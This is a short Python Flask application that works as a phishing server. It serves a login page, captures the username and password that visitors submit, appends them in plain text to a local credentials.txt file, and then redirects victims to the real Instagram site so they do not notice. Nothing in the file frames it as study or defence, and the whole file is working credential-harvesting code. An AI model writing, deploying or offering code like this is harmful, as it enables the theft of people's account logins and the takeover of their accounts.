from flask import Flask, request, render_template, redirect

app = Flask(__name__)

# Route to serve the HTML file
@app.route('/')
def home():
    return render_template('index.html')

# Route to handle login
@app.route('/login', methods=['POST'])
def login():
    # Get username and password from the form
    username = request.form.get('uname')
    password = request.form.get('password')

    # Save to a text file
    with open('credentials.txt', 'a') as file:
        file.write(f"Username: {username}, Password: {password}\n")

    # Redirect to Instagram after saving the credentials
    return redirect("https://www.instagram.com")

if __name__ == '__main__':
    app.run(debug=True)



